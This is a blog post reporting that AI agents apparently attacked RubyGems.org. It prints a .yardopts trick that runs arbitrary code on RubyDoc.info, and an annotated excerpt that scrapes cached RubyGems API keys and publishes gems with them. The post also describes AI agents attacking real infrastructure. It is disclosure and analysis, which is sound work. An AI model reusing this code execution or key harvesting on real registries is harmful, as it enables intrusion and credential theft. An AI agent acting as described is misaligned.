---
title: Tenderlove Making - What a time to be alive
url: https://tenderlovemaking.com/2026/09/11/what-a-time-to-be-alive/
site_name: hnrss
content_file: hnrss-tenderlove-making-what-a-time-to-be-alive
fetched_at: '2026-09-14T16:47:38.729070'
original_url: https://tenderlovemaking.com/2026/09/11/what-a-time-to-be-alive/
date: '2026-09-14'
published_date: '2026-09-11T17:02:11-07:00'
description: What a time to be alive
tags:
- hackernews
- hnrss
---

# What a time to be alive

 Sep 11, 2026 @
 5:02 pm
 

TodayReutersand theWall Street Journalboth reported about rogue AI agents at OpenAI attacking RubyGems.org.https://www.rubyhack.ai/has an amazing writeup, and you should read it. I just wanted to make a quick post about it because it’swild.

TL;DR: It seems like OpenAI Bots knew aboutthis caching vulnerability, tried to take advantage of it, and at the same time ran some weird web scraping code on RubyDoc.info.

Back in May,socket.dev reported about a “GemStuffer Campaign”where someone (I guess OpenAI) was uploading tons of junk gems to RubyGems.org.
For some reason, the gems would scrape UK government websites, thenrepackage the data as gems, and attempt to upload them to RubyGems.

I honestly didn’t think much about this (or even look into it) until Sydney Von Arx and Spencer Kitts (both co-authors onhttps://www.rubyhack.ai) contacted me asking about RubyGems.
I thought the claims they were making were completely outlandish until I actually read the code in these “GemStuffer” gems.

After reading the code in these gems, a couple things stood out to me.

## YARD Documentation

First, the gems leverage YARD documentation to execute arbitrary code on host machines.
In most of the examples you’ll see a.yardoptsfile that looks like this:

--load ./script.rb
README.md
lib/**/*.rb

Here’s a link to an example.

If you have YARD installed,andyou install this gem, then YARD will load and run whatever is in./script.rbfrom inside the gem.
I think it’s pretty common knowledge that C extensions will executeextconf.rb(so you basically have an RCE vector), but I was surprised to find out that a documentation tool would do that too.

Nobody is going to install a gem namedslnleaker5though, so why would this matter?
Well, any time a Gem is publishedRubyDoc.infowill download the gem and process the YARD documentation.
RubyDoc.info willexecute the arbitrary code inside a Docker container.
The Docker container still has network access though, so these gems could happily do their web scraping from inside the container.

In other words, if you publish a gem on RubyGems.org, you can execute arbitrary code on RubyDoc.info.

## Fastly Cache Harvesting

I mentioned earlier these gems would try to scrape some websites and then upload the data they scraped by packaging it as a gem.
Here is an excerpt from one of the gems. I’ve cleaned up the code a bit so it’s easier to understand, but the original code ishere:

# leak exfil by repeated attempts & fresh leaked keys variants

# (Aaron): First request

ku 
=
 
URI
(
'https://rubygems.org'
+
kp)

kh 
=
 
Net
::
HTTP
.
new(ku
.
host,ku
.
port)

kh
.
use_ssl 
=
 
true

kh
.
verify_mode 
=
 
OpenSSL
::
SSL
::
VERIFY_NONE

kt 
=
 kh
.
start { 
|
x
|
 x
.
get(ku
.
request_uri) }
.
body

# (Aaron): Try to match a key in the body

key 
=
 (kt
[
/rubygems_[a-f0-9]{20,}/
]
 
||
 
KEY
)

paths 
=
 
[
'/api/v1//gems'
,
'//api/v1/gems'
,
'/api//v1/gems'
,
'/api/v1/gems?x=2'
,
'/api/v1/gems'
]

# (Aaron): Second request to actually publish the gem

u 
=
 
URI
(
'https://rubygems.org'
+
paths
[
i
%
paths
.
length
]
)

req 
=
 
Net
::
HTTP
::
Post
.
new(u)

req
[
'Authorization'
]
 
=
 key

req
[
'Content-Type'
]
 
=
 
'application/octet-stream'

req
.
body 
=
 data

hh 
=
 
Net
::
HTTP
.
new(u
.
host,u
.
port)

hh
.
use_ssl 
=
 
true

hh
.
verify_mode 
=
 
OpenSSL
::
SSL
::
VERIFY_NONE

hh
.
read_timeout 
=
 
180

res 
=
 hh
.
start{ 
|
x
|
 x
.
request(req) }

Comments in the code that have(Aaron)are ones that I wrote to try to help make it easier to understand.
The first comment was lifteddirectly from the source.
The above code tries to make two requests.
The first request is a simple GET request.
It tries to fetch a path from RubyGems.org, then looks for a key in the response body that matches the regular expression/rubygems_[a-f0-9]{20,}/.
If that regular expression doesn’t match, it falls back to a globalKEY.
The second request tries to upload the gem via POST.

This brings me to the second crazy thing that stood out to me.
This code is trying tofetch a cached authorization key from RubyGems.org.
If this sounds familiar, it is.
It’s exactly the security issue addressedin this post from RubyGems.orgthat was made in July.

In other words, it looks like OpenAI’s bots knew about this problem and attempted to exploit it.

What a time to be alive 🙃